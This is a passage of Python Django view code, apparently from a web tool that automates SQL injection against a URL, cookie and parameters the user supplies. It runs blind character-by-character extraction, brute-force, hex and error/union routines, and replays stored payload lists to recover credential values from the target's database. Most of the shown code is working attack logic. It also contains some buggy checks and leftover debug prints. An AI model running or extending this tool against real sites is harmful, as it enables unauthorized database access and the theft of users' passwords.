                attack_querys += result[1] + '\n'
                value += chr(i)
                break

        if value != '':
            for cnt in range(len_value-1):
                for i in range(20, int(dicQuery['range']) + 100):
                    if i == 37:
                        continue
                    res = sendQuery(dicQuery, {dicQuery['name']: value + chr(i) + '%'})
                    result = findUserKeyword(res, dicQuery['find'])
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        value += chr(i)
                        break
            print(value, 'value')

    return value, attack_querys


def index(request):
    return render(request, 'injection/index.html', {})


def main(request):
    user_query = {'url': '',  'cookie': '', 'name': '', 'method': '', 'parameter': '', 'find': ''}


    if request.method == 'POST':
        url = request.POST.get("url", False)
        cookie = request.POST.get("cookie", False)
        find = request.POST.get("find", False)
        name = request.POST.get("name", False)
        method = request.POST.get("method", False)
        parameter = request.POST.get("parameter", False)
        slider = request.POST.get("slider",False)
        know = request.POST.get("know",False)


        user_query['url'] = url
        user_query['cookie'] = cookie
        user_query['find'] = find
        user_query['name'] = name
        user_query['method'] = method
        user_query['parameter'] = parameter
        user_query['range'] = slider
        user_query['know'] = know


        a, value, start = checkAttackAble(user_query)
        print('start',start)
        print('a', a)
        print('value', value)
        column_cnt = ''
        db_name = ''
        table = ''
        column = ''
        pw = {}
        name = user_query['name'].split(',')
        print('name-------', name)
        attack = user_query['know'].split(',')

        if a == 4 or a == 5 or a == 6:
            for name_p in name:
                user_query['name'] = name_p
                for know in attack:
                    if know in pw.keys():
                        continue
                    pw[know], value, length = error(start, user_query, value, know )

            column_cnt = db_union_error(user_query,start)




        else :
            for name_p in name :
                user_query['name'] = name_p
                for know in attack :
                    if know in pw.keys():
                        continue
                    if a != -1:
                        pw_tmp, value, length = brute(start, user_query, value, know)
                        print(pw_tmp,'pw_tmp=======')
                        # if pw_tmp != '        ' and pw_tmp != '                ' and pw_tmp != '                        ' and pw_tmp != '' and pw_tmp!= '\x00\x00\x00\x00\x00\x00\x00\x00' and pw_tmp != '\x00':
                        if pw_tmp != '':
                            pw[know] = pw_tmp
                        print(pw[know], '확인 1 --------------')


                        if not know in pw.keys():
                            pw_tmp, value, st,length =  brute2(start,user_query,value,length,know)
                            if pw_tmp != '':
                                pw[know] = pw_tmp

                        if not know in pw.keys():
                            pw_tmp, value = hex(start, user_query, value, length, know, st)
                            if pw_tmp != '\x00\x00\x00\x00\x00\x00\x00\x00' or pw_tmp != '        ' or pw_tmp != '                ' or pw_tmp != '                        ' or pw_tmp != '':
                                pw[know] = pw_tmp
                        '''

                        column_cnt,db_name = db_union(user_query,start)
                        print(db_name)
                        if db_name != '':
                            table = table_name(user_query,start,db_name)
                            if table != '' :
                                column = column_name(user_query,start,table)
                                '''

                        # b,url = union(url, cookie, find, name, method, parameter, result,flag,start)

                        print(pw,'확인 -----------')


                if  attack[0] in pw.keys() or attack[0] in pw.keys() and attack[1] in pw.keys():
                    break



        if a == -1 :
            db_query = list.objects.filter(stand='query')
            for name in attack :
                for i in db_query:
                    res = sendQuery(user_query, {
                        name :  i })
                    result = findUserKeyword(res, user_query['find'])

                    if result[0] == 1:
                        value += result[1] + '\n'
                        pw[name] = i


            for know in attack:
                if not know in pw.keys():
                    pw[know],value = filter(user_query)

            if pw[know]=='' and len(attack)==2:
                db_query1 = list.objects.filter(stand='query1')
                db_query2 = list.objects.filter(stand='query2')
                l = len(db_query1)
                print(l,'len----')
                print(name)
                for k in range(l):
                    res = sendQuery(user_query, {
                        attack[0]: db_query1[k], attack[1]:db_query2[k]})
                    result = findUserKeyword(res, user_query['find'])

                    print(result)
                    if result[0] == 1:
                        print(db_query1[k], db_query2[k])
                        value += result[1] + '\n'
                        print(name[0],name[1])
                        pw[name[0]]= db_query1[k]
                        pw[name[1]]= db_query2[k]

                        break


        List = list.objects.order_by()

        print(a,'a-----------------------------')

        if (a != -1):
            if (a == 1 or a == 4):
                return render(request, 'injection/result.html',
                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
            elif (a == 2 or a == 5):
                return render(request, 'injection/result.html',
                              {'data': value, 'single': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table,'column_name' : column})
            elif (a == 3 or a == 6):
                return render(request, 'injection/result.html',
                              {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})

        else:
            return render(request, 'injection/result.html',{'data': value,'list': List, 'origin': str(user_query), 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})

    return 1
